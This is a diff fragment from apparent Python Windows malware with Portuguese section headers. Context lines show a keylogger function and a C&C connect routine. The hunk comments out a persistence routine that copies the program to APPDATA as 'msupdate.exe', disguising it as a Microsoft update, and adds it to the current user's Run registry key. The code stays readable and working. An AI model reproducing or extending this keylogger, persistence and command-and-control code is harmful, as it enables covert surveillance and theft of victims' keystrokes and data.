@@ -64,14 +64,14 @@ def start_keylogger():
         pass
 
 # ---------- PERSISTÊNCIA ----------
-def persist():
-    dst = os.path.join(os.getenv("APPDATA"), "msupdate.exe")
-    if not os.path.exists(dst):
-        shutil.copy2(sys.executable, dst)
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
-                               r"Software\Microsoft\Windows\CurrentVersion\Run")
-        winreg.SetValueEx(key, "msupdate", 0, winreg.REG_SZ, dst)
-        winreg.CloseKey(key)
+#def persist():
+ #   dst = os.path.join(os.getenv("APPDATA"), "msupdate.exe")
+  #  if not os.path.exists(dst):
+   #     shutil.copy2(sys.executable, dst)
+    #    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
+     #                          r"Software\Microsoft\Windows\CurrentVersion\Run")
+      #  winreg.SetValueEx(key, "msupdate", 0, winreg.REG_SZ, dst)
+       # winreg.CloseKey(key)
 
 # ---------- C&C ----------
 def connect(ip, port):
